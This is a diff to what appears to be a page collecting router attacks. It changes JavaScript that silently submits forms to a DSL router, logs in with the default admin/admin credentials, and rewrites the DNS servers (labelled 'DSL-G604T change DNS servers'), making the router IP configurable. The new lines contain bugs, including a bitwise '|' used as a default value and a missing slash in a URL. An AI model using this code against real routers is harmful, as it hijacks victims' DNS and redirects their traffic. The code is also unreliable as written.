@@ -1375,8 +1375,9 @@ function xss(payload) { /* grax por el fix Alvaro Soto*/
 	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/web.....9;'+payload;
 }
 function login() {
+	ip = ip | "192.168.1.1"
 	var f = document.createElement('form');
-	f.action = 'http://192.168.1.1/cgi-bin/webcm';
+	f.action = 'http://' + ip  + 'cgi-bin/webcm';
 	f.innerHTML = '<input type="hidden" name="getpage" value="../html/home.htm"><input type="hidden" name="errorpage" value="../html/index.html">';
 	f.innerHTML += '<input type="hidden" name="login:command/username" value="admin"><input type="hidden" name="login:command/password" value="admin">';
 	f.innerHTML += '<input type="hidden" name="var:errormsg" value="Error">';
@@ -1403,17 +1404,18 @@ function posts(url, fields) {
 	document.body.appendChild(p);
 	p.submit();
 }
-function changeDNS(server) {
+function changeDNS(server, ip) {
+	ip = ip | "192.168.1.1";
 	login();
 	setTimeout(function() {
 		var fields = '<input type="hidden" name="getpage" value="../html/setup/dns.htm">';
 		fields += '<input type="hidden" name="resolver:settings/nameserver1" value="'+server+'">';
 		fields += '<input type="hidden" name="resolver:settings/nameserver2" value="'+server+'">';
 		fields += '<input type="hidden" name="dproxy:settings/state" value="2">';
-		posts('http://192.168.1.1/cgi-bin/webcm',fields);
+		posts('http://' + ip + '/cgi-bin/webcm',fields);
 	}, 2000);
 	setTimeout(function() {
-		posts('http://192.168.1.1/cgi-bin/web.....;<input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm">');
+		posts('http://' + ip + '/cgi-bin/web.....;<input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm">');
 	},5000);
 }
 /* end pdp */
@@ -2933,7 +2935,7 @@ a=a+1
 	<div>02/05/08</div>
 	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
 	<div><a href="javascript:dlidns()">DSL-G604T change DNS servers</a></div>
-	<div></div>
+	<div><a href="javascript:dlidns(ip)">[SET IP]</a></div>
 </article>
 
 <article>
